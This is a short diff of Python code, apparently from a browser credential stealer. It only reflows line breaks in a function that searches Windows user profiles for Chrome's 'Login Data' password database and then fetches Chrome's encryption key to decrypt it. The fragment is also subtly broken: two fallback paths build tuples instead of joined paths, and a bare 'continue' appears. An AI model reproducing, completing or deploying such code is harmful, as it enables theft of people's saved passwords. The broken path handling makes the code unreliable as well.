@@ -346,15 +346,12 @@ if yes == "yes":
 	def main():
 		try:
 			binks = ""
-			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-									"Google", "Chrome", "User Data", "default", "Login Data")
+			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
 			if not os.path.exists(db_path):
 
-				db_path = os.environ["USERPROFILE"], "AppData", "Local",
-									"Google", "Chrome", "User Data", "Profile 1", "Login Data"
+				db_path = os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 1", "Login Data"
 				if not os.path.exists(db_path):
-					db_path = os.environ["USERPROFILE"], "AppData", "Local",
-									"Google", "Chrome", "User Data", "Profile 2", "Login Data"
+					db_path = os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 2", "Login Data"
 					if not os.path.exists(db_path):
 						continue
 			key = fetching_encryption_key()
